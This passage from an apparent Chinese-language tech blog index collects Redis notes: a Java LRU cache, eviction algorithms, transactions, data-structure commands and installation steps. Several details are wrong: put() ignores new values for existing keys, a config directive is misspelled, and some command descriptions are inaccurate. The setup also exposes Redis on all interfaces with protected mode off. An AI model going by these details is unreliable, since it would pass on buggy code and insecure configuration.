class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span>&lt;<span class="title">k</span>, <span class="title">v</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">//容量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="comment">//当前有多少节点的统计</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">    <span class="comment">//缓存节点</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;k, Node&lt;k, v&gt;&gt; nodeMap;</span><br><span class="line">    <span class="keyword">private</span> Node&lt;k, v&gt; head;</span><br><span class="line">    <span class="keyword">private</span> Node&lt;k, v&gt; tail;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(String.valueOf(capacity));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        <span class="keyword">this</span>.nodeMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//初始化头节点和尾节点，利用哨兵模式减少判断头结点和尾节点为空的代码</span></span><br><span class="line">        Node headNode = <span class="keyword">new</span> Node(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Node tailNode = <span class="keyword">new</span> Node(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        headNode.next = tailNode;</span><br><span class="line">        tailNode.pre = headNode;</span><br><span class="line">        <span class="keyword">this</span>.head = headNode;</span><br><span class="line">        <span class="keyword">this</span>.tail = tailNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(k key, v value)</span> </span>&#123;</span><br><span class="line">        Node&lt;k, v&gt; node = nodeMap.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count &gt;= capacity) &#123;</span><br><span class="line">                <span class="comment">//先移除一个节点</span></span><br><span class="line">                removeNode();</span><br><span class="line">            &#125;</span><br><span class="line">            node = <span class="keyword">new</span> Node&lt;&gt;(key, value);</span><br><span class="line">            <span class="comment">//添加节点</span></span><br><span class="line">            addNode(node);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//移动节点到头节点</span></span><br><span class="line">            moveNodeToHead(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Node&lt;k, v&gt; <span class="title">get</span><span class="params">(k key)</span> </span>&#123;</span><br><span class="line">        Node&lt;k, v&gt; node = nodeMap.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="keyword">null</span>) &#123;</span><br><span class="line">            moveNodeToHead(node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Node node = tail.pre;</span><br><span class="line">        <span class="comment">//从链表里面移除</span></span><br><span class="line">        removeFromList(node);</span><br><span class="line">        nodeMap.remove(node.key);</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeFromList</span><span class="params">(Node&lt;k, v&gt; node)</span> </span>&#123;</span><br><span class="line">        Node pre = node.pre;</span><br><span class="line">        Node next = node.next;</span><br><span class="line"></span><br><span class="line">        pre.next = next;</span><br><span class="line">        next.pre = pre;</span><br><span class="line"></span><br><span class="line">        node.next = <span class="keyword">null</span>;</span><br><span class="line">        node.pre = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addNode</span><span class="params">(Node&lt;k, v&gt; node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//添加节点到头部</span></span><br><span class="line">        addToHead(node);</span><br><span class="line">        nodeMap.put(node.key, node);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addToHead</span><span class="params">(Node&lt;k, v&gt; node)</span> </span>&#123;</span><br><span class="line">        Node next = head.next;</span><br><span class="line">        next.pre = node;</span><br><span class="line">        node.next = next;</span><br><span class="line">        node.pre = head;</span><br><span class="line">        head.next = node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveNodeToHead</span><span class="params">(Node&lt;k, v&gt; node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//从链表里面移除</span></span><br><span class="line">        removeFromList(node);</span><br><span class="line">        <span class="comment">//添加节点到头部</span></span><br><span class="line">        addToHead(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">k</span>, <span class="title">v</span>&gt; </span>&#123;</span><br><span class="line">        k key;</span><br><span class="line">        v value;</span><br><span class="line">        Node pre;</span><br><span class="line">        Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(k key, v value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><h3 id="LRU在Redis中的实现"><a href="#LRU在Redis中的实现" class="headerlink" title="LRU在Redis中的实现"></a>LRU在Redis中的实现</h3><h4 id="近似LRU算法"><a href="#近似LRU算法" class="headerlink" title="近似LRU算法"></a>近似LRU算法</h4><p>Redis使用的是近似LRU算法，它跟常规的LRU算法还不太一样。近似LRU算法通过随机采样法淘汰数据，每次随机出5（默认）个key，从里面淘汰掉最近最少使用的key。</p><blockquote><p>可以通过maxmemory-samples参数修改采样数量：例：maxmemory-samples 10 maxmenory-samples配置的越大，淘汰的结果越接近于严格的LRU算法</p></blockquote><p>Redis为了实现近似LRU算法，给每个key增加了一个额外增加了一个24bit的字段，用来存储该key最后一次被访问的时间。</p><h4 id="Redis3-0对近似LRU的优化"><a href="#Redis3-0对近似LRU的优化" class="headerlink" title="Redis3.0对近似LRU的优化"></a>Redis3.0对近似LRU的优化</h4><p>Redis3.0对近似LRU算法进行了一些优化。新算法会维护一个候选池（大小为16），池中的数据根据访问时间进行排序，第一次随机选取的key都会放入池中，随后每次随机选取的key只有在访问时间小于池中最小的时间才会放入池中，直到候选池被放满。当放满后，如果有新的key需要放入，则将池中最后访问时间最大（最近被访问）的移除。</p><p>当需要淘汰的时候，则直接从池中选取最近访问时间最小（最久没被访问）的key淘汰掉就行。</p><h4 id="LRU算法的对比"><a href="#LRU算法的对比" class="headerlink" title="LRU算法的对比"></a>LRU算法的对比</h4><p>我们可以通过一个实验对比各LRU算法的准确率，先往Redis里面添加一定数量的数据n，使Redis可用内存用完，再往Redis里面添加n/2的新数据，这个时候就需要淘汰掉一部分的数据，如果按照严格的LRU算法，应该淘汰掉的是最先加入的n/2的数据。生成如下各LRU算法的对比图：</p><p><img src="Redis1.png" alt=""></p><p>可以看到图中有三种不同颜色的点：</p><ul><li>浅灰色是被淘汰的数据</li><li>灰色是没有被淘汰掉的老数据</li><li>绿色是新加入的数据</li></ul><p>能看到Redis3.0采样数是10生成的图最接近于严格的LRU。而同样使用5个采样数，Redis3.0也要优于Redis2.8。</p><h3 id="LFU算法"><a href="#LFU算法" class="headerlink" title="LFU算法"></a>LFU算法</h3><p>LFU算法是Redis4.0里面新加的一种淘汰策略。它的全称是Least Frequently Used，它的核心思想是根据key的最近被访问的频率进行淘汰，很少被访问的优先被淘汰，被访问的多的则被留下来。</p><p>LFU算法能更好的表示一个key被访问的热度。假如你使用的是LRU算法，一个key很久没有被访问到，只刚刚是偶尔被访问了一次，那么它就被认为是热点数据，不会被淘汰，而有些key将来是很有可能被访问到的则被淘汰了。如果使用LFU算法则不会出现这种情况，因为使用一次并不会使一个key成为热点数据。<br>LFU一共有两种策略：</p><ul><li>volatile-lfu：在设置了过期时间的key中使用LFU算法淘汰key</li><li>allkeys-lfu：在所有的key中使用LFU算法淘汰数据</li></ul><p>设置使用这两种淘汰策略跟前面讲的一样，不过要注意的一点是这两周策略只能在Redis4.0及以上设置，如果在Redis4.0以下设置会报错</p>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis Transcation</title>
      <link href="/2019/04/13/Redis-Transcation/"/>
      <url>/2019/04/13/Redis-Transcation/</url>
      
        <content type="html"><![CDATA[<h2 id="特性与事务"><a href="#特性与事务" class="headerlink" title="特性与事务"></a>特性与事务</h2><h3 id="多数据库"><a href="#多数据库" class="headerlink" title="多数据库"></a>多数据库</h3><p>一个Redis实例最多可以提供16个数据库，下标分别是0~15，客户端默认的是0号数据库</p><ol><li>select [db num]即可选择几号数据库</li><li>move [key] [db num]；将key移至另一个数据库，剪贴操作</li></ol><h3 id="事物"><a href="#事物" class="headerlink" title="事物"></a>事物</h3><p>事物中所有命令都会被串行化顺序去执行。<br>事务执行期间redis不会再为其他客户端提供服务，以保证事物原子化执行（即事物期间的操作对其他客户端不会造成影响）<br>事物中一个命令执行失败，后面的命令还是会顺序执行。</p><ol><li>multi 开启事务</li><li>exec 提交事务</li><li>discard 撤销事务（之前所有的操作）</li></ol>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis Data Structure</title>
      <link href="/2019/04/12/Redis-Data-Structure/"/>
      <url>/2019/04/12/Redis-Data-Structure/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis数据结构"><a href="#Redis数据结构" class="headerlink" title="Redis数据结构"></a>Redis数据结构</h2><h3 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串 String"></a>字符串 String</h3><blockquote><p>二进制安全的，存入和获取的数据相同。也就是说 redis 的 string 可以包含任何数据。比如 jpg 图片或者序列化的对象。<br>Value最多可以容纳的数据长度是512MB<br>相当于java中的map</p></blockquote><h4 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 赋值</span><br><span class="line">set [key] [value]</span><br><span class="line">2. 取值</span><br><span class="line">get [key] [value]</span><br><span class="line">3. 取赋值</span><br><span class="line">getset [key] [value]</span><br><span class="line">先把key中的值显示出来，再把新的value值赋进去</span><br><span class="line">4. 删值</span><br><span class="line">del [key]</span><br><span class="line">5. 自增值</span><br><span class="line">incr [key]</span><br><span class="line">如果key不存在，则创建且赋值1；如果key存在，数值型则+1，否则报错</span><br><span class="line">6. 自减值</span><br><span class="line">decr [key]</span><br><span class="line">如果key不存在，则创建且赋值-1；如果key存在，数值型则-1，否则报错</span><br><span class="line">7. 指定数值加减</span><br><span class="line">incrby&#x2F;decrby [key] [具体数字]  同上</span><br><span class="line">8. 字符串拼接</span><br><span class="line">append [key] [具体字符，可以数字]</span><br><span class="line">数字拼接数字还是数字</span><br></pre></td></tr></table></figure><h3 id="哈希-Hash"><a href="#哈希-Hash" class="headerlink" title="哈希 Hash"></a>哈希 Hash</h3><blockquote><p>String Key 和 String Value 的map容器。可以将其想成一个 hash 对应着多个 string。<br>每一个hash可以存储4294967295个键值对</p></blockquote><h4 id="与-String-的区别"><a href="#与-String-的区别" class="headerlink" title="与 String 的区别"></a>与 String 的区别</h4><p>string 是 一个 key - value 键值对，而 hash 是多个 key - value 键值对。<br><img src="Redis2.png" alt=""></p><h4 id="常用语句-1"><a href="#常用语句-1" class="headerlink" title="常用语句"></a>常用语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. 单次赋值</span><br><span class="line">hset [hashkey] [key] [value]</span><br><span class="line">hmset [hashkey] [key1] [value1] [key2] [value2]....</span><br><span class="line">2. 取值</span><br><span class="line">hget [hashkey] [key]</span><br><span class="line">hmget [hashkey] [key1] [key2]....</span><br><span class="line">hgetall [hashkey]</span><br><span class="line">3. 删值</span><br><span class="line">hdel [hashkey] [key1] [key2]...</span><br><span class="line">del [hashkey]</span><br><span class="line">4. 指定数值加减</span><br><span class="line">hincrby [hashkey] [key] [具体数字]</span><br><span class="line">同上述命令</span><br><span class="line">5. 判断键值对是否存在</span><br><span class="line">hexists myhash username</span><br><span class="line">6. 一个哈希中有几个属性</span><br><span class="line">hlen [hashkey]</span><br><span class="line">7. 一个hash中所有的key</span><br><span class="line">hkeys [hashkey]</span><br><span class="line">8. 一个hash中所有的value值</span><br><span class="line">hvals [hashkey]</span><br></pre></td></tr></table></figure><h3 id="字符串列表-List"><a href="#字符串列表-List" class="headerlink" title="字符串列表 List"></a>字符串列表 List</h3><blockquote><p>ArrayList使用数组方式【Java】<br>LinkedList使用双向链接方式【Redis】。即按照插入顺序排序。我们可以往列表的左边或者右边添加元素。<br>list 内的元素是可重复的。</p></blockquote><h4 id="常用语句-2"><a href="#常用语句-2" class="headerlink" title="常用语句"></a>常用语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1. 从左侧依次插入value值，若链表不存在则自动创建</span><br><span class="line">lpush [listkey] [value1] [value2]...</span><br><span class="line">仅当链表存在时才会在头部插入</span><br><span class="line">lpushx [listkey] [value]</span><br><span class="line">2. 从右侧依次插入value值，若链表不存在则自动创建</span><br><span class="line">rpush [listkey] [value1] [value2]...</span><br><span class="line">仅当链表存在时才会在尾部插入</span><br><span class="line">rpushx [listkey] [value]</span><br><span class="line">3. 指定起始终点位置（0开始）列出表中元素，-1代表倒数第一个，-2倒数第二个</span><br><span class="line">lrange [listkey] [start] [end]</span><br><span class="line">4. 头部弹出一个value</span><br><span class="line">lpop [listkey]</span><br><span class="line">5. 尾部弹出一个value</span><br><span class="line">rpop [listkey]</span><br><span class="line">6. 查看链表长度</span><br><span class="line">llen mylist</span><br><span class="line">7. 从头到尾删除掉count个value，count为负时则从后往前删除，count为0时则删除所有的value</span><br><span class="line">lrem [listkey] [count] [value]</span><br><span class="line">8. 在第location个角标处设置value值</span><br><span class="line">lset [listkey] [location] [value]</span><br><span class="line">9. 在指定的第一个value之前&#x2F;后插入值</span><br><span class="line">linsert [listkey] before&#x2F;after [exist value] [new value]</span><br><span class="line">10. 将第一个链表的最后一个值弹出并压入第二个链表的头部</span><br><span class="line">rpoplpush [listkey1] [listkey2]</span><br><span class="line"></span><br><span class="line">lpush的程序称为**生产者**；</span><br><span class="line">lpop的程序称为**消费者**；</span><br><span class="line">rpoplpush是为了备份，避免消费者程序崩溃导致的数据丢失。</span><br></pre></td></tr></table></figure><h3 id="字符串集合-set"><a href="#字符串集合-set" class="headerlink" title="字符串集合 set"></a>字符串集合 set</h3><blockquote><p>无序。<br>不允许出现重复的元素。</p></blockquote><blockquote><p>集合是通过哈希表实现的，因此添加、删除、查找的复杂度都是 O(1)。也可以确保id的唯一，跟踪一些唯一性数据，同时可以得出两个集合中的同一id（比如哪个顾客同时购买了这两个商品），用于维护数据对象之间的关联关系。<br>能完成多个服务器端的聚合操作。</p></blockquote><blockquote><p>可包含的最大元素数量是4294967295。</p></blockquote><blockquote><p>redis 的 set 是一个 key 对应着 多个字符串类型的 value，也是一个字符串类型的集合</p></blockquote><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1. 添加元素，不能添加重复项</span><br><span class="line">sadd [setkey] [value1] [value2]....</span><br><span class="line">2. 删除元素</span><br><span class="line">srem [setkey] [value1] [value2]....</span><br><span class="line">3. 列出set中所有元素</span><br><span class="line">smembers [setkey]</span><br><span class="line">4. 判断set中是否有value，若有返回1，无返回0</span><br><span class="line">sismember [setkey] [value]</span><br><span class="line">5. 差集运算，返回两个set集合的差集，即返回1中有但2中没有的元素</span><br><span class="line">sdiff [setkey1] [setkey2]</span><br><span class="line">6. 交集运算</span><br><span class="line">sinter [setkey1] [setkey2]</span><br><span class="line">7. 并集运算</span><br><span class="line">sunion [setkey1] [setkey2]</span><br><span class="line">8. 得到set集合中元素个数</span><br><span class="line">scard [setkey]</span><br><span class="line">9. 随机返回一个set集合中的元素</span><br><span class="line">srandmenber [setkey]</span><br><span class="line">10. 将两个集合相差的成员存储到一个其他的集合上</span><br><span class="line">sdiffstore [new setkey] [setkey1] [setkey2]</span><br><span class="line">11. 将两个集合相交的成员存储到一个其他的集合上</span><br><span class="line">sinterstore [new setkey] [setkey1] [setkey2]</span><br><span class="line">12. 将两个集合的并集存储到一个其他的集合上</span><br><span class="line">sunionstore [new setkey] [setkey1] [setkey2]</span><br></pre></td></tr></table></figure><h3 id="有序字符串集合-Zset"><a href="#有序字符串集合-Zset" class="headerlink" title="有序字符串集合 Zset"></a>有序字符串集合 Zset</h3><blockquote><p>zset 每个元素都会关联一个 double 类型的分数。redis 通过分数来为集合中的成员进行从小到大的排序。<br>zset 的元素是唯一的，但是分数（score）却可以重复。<br>PS : 游戏的排名，微博的热点话题，构建索引数据等等。</p></blockquote><p><img src="Redis3.png" alt=""></p><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. 添加元素，若已存在元素，则会用新的分数去替换原有的分数</span><br><span class="line">zadd [sortkey] [分数1] [value1] [分数2] [value2]...</span><br><span class="line">2. 获得元素的分数</span><br><span class="line">zscore [sortkey] [value]</span><br><span class="line">3. 获取元素数量</span><br><span class="line">zcard [sortkey]</span><br><span class="line">4. 删除sortset集合中的元素</span><br><span class="line">zrem [sortkey] [value1] [value2]</span><br><span class="line">5. 指定位置查询元素</span><br><span class="line">zrange [sortkey] [start] [end]</span><br><span class="line">zrange [sortkey] [start] [end] withscores 由大到小</span><br><span class="line">zrevrange [sortkey] [start] [end] withscores 由小到大</span><br><span class="line">6. 按照范围删除元素</span><br><span class="line">zremrangebyrank [sortkey] [start] [end]</span><br><span class="line">7. 按照分数删除元素</span><br><span class="line">zremrangebyscore [sortkey] [start score] [end score]</span><br><span class="line">zrangebyscore [sortkey] [start] [end] withscores limit [start location] [count]</span><br><span class="line">8. 对元素value加count</span><br><span class="line">zincrby [sortkey] [count] [value]</span><br><span class="line">9. 两个分数之间的计数</span><br><span class="line">zcout [sortkey] [start score] [end score]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis Operation</title>
      <link href="/2019/04/11/Redis-Operation/"/>
      <url>/2019/04/11/Redis-Operation/</url>
      
        <content type="html"><![CDATA[<h2 id="Key的通用操作"><a href="#Key的通用操作" class="headerlink" title="Key的通用操作"></a>Key的通用操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1. 查看所有的key</span><br><span class="line">&gt; keys *</span><br><span class="line">2. 模糊查询key：</span><br><span class="line">&gt; ?某些已知字符?</span><br><span class="line">3. 删除key：</span><br><span class="line">&gt; del [key1] [key2]....</span><br><span class="line">4. 判断是否存在：</span><br><span class="line">&gt; exists [key]</span><br><span class="line">5. 重命名key：</span><br><span class="line">&gt; rename [existed key] [new key]</span><br><span class="line">6. 设置过期的时间，单位秒：</span><br><span class="line">&gt; expire [key] [time]</span><br><span class="line">7. 查看key所剩时间：</span><br><span class="line">&gt; ttl [key]，没有则返回-1</span><br><span class="line">8. 获得指定key的类型：</span><br><span class="line">&gt; type [key]</span><br><span class="line">9. flushall：</span><br><span class="line">&gt; 清空数据库</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis Introduction</title>
      <link href="/2019/04/11/Redis-Introduction/"/>
      <url>/2019/04/11/Redis-Introduction/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis概述"><a href="#Redis概述" class="headerlink" title="Redis概述"></a>Redis概述</h2><blockquote><p>Redis 是完全开源免费的，遵守 BSD 协议，是一个高性能的 key - value 数据库<br>Redis 的所有操作都是原子性的</p></blockquote><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ol><li>高速缓冲</li><li>任务队列</li><li>应用排行榜</li><li>网站访问统计</li><li>数据过期处理</li><li>分布式集群架构中的session分离</li></ol><h2 id="Redis-支持的五类键值数据类型："><a href="#Redis-支持的五类键值数据类型：" class="headerlink" title="Redis 支持的五类键值数据类型："></a>Redis 支持的五类键值数据类型：</h2><ol><li>字符串类型String</li><li>列表类型List</li><li>集合类型Set</li><li>有序集合类型Zset</li><li>散列类型Hash</li></ol><h2 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h2><ol><li>首先下载最新版本的redis <a href="https://redis.io/download" target="_blank" rel="noopener">下载</a><blockquote><p>wget <a href="http://download.redis.io/releases/redis-4.0.6.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-4.0.6.tar.gz</a></p></blockquote></li><li>在路径下解压<blockquote><p>tar xzf redis-4.0.6.tar.gz</p></blockquote></li><li>进入文件夹进行编译（此文件夹即为安装路径）<blockquote><p>cd redis-4.0.6<br><br>make</p></blockquote></li><li>执行安装<blockquote><p>make install</p></blockquote></li><li>查看安装版本<blockquote><p>redis-server -v</p></blockquote></li><li>修改端口和密码<blockquote><p>安装目录下 vi redis.conf<br><br>daemonize yes<br><br>bind 0.0.0.0<br>protected-mode no<br><br>port 6060<br><br>requiredpass Kirito</p></blockquote></li><li>启动服务<blockquote><p>redis-server redis.conf</p></blockquote></li><li>关闭服务<blockquote><p>ps aux|grep redis<br><br>kill -9 进程号<br><br>或者进入终端执行命令 shutdown<br><br>或者 redis-cli shutdown</p></blockquote></li><li>新开终端<blockquote><p>redis-cli -p 6060 -a Kirito</p></blockquote></li><li>阿里云安全配置打开端口</li></ol><h2 id="Redis基本操作"><a href="#Redis基本操作" class="headerlink" title="Redis基本操作"></a>Redis基本操作</h2><ul><li>验证在工作<br>ping：返回pang</li><li>存放数据<br>set [key] [value]</li><li>获取数据<br>get [key] [value]</li><li>删除数据<br>del [key] [value]</li><li>查看所有key<br>keys *</li><li>退出<br>exit</li></ul>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NoSQL</title>
      <link href="/2019/04/01/NoSQL/"/>
      <url>/2019/04/01/NoSQL/</url>
      
        <content type="html"><![CDATA[<h2 id="NoSQL概述"><a href="#NoSQL概述" class="headerlink" title="NoSQL概述"></a>NoSQL概述</h2><blockquote><p>NoSQL：Not Only SQL<br><a href="http://redisdoc.com" target="_blank" rel="noopener">官方手册</a><br><a href="https://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener">教程</a></p></blockquote><h4 id="NoSQL特点："><a href="#NoSQL特点：" class="headerlink" title="NoSQL特点："></a>NoSQL特点：</h4><ol><li>High performance - 高并发读写</li><li>Huge Storage - 海量数据的高效率存储和访问</li><li>High Scalability &amp;&amp; High Availability - 高可扩展性（因为去掉了关系型数据库其中的关系，使得数据之间没有关系了）和高可用性</li><li>灵活的数据模型，无需事先建立字段</li></ol><h4 id="NoSQL数据库的四大分类："><a href="#NoSQL数据库的四大分类：" class="headerlink" title="NoSQL数据库的四大分类："></a>NoSQL数据库的四大分类：</h4><ol><li><strong>键值对（Key-Value）存储</strong> 能快速查询，但数据缺少结构化</li><li><strong>列存储</strong> 能快速查询，扩展性比较强，但功能相对于局限</li><li><strong>文档数据库</strong> mangodb，数据结构要求不高，但查询性能不高，而且缺少统一查询的语法</li><li><strong>图形数据库</strong> 一些社交网站所用，需要对整个图做计算才能得出结果，不容易做分布式的集群方案</li></ol><h2 id="SQL与NOSQL"><a href="#SQL与NOSQL" class="headerlink" 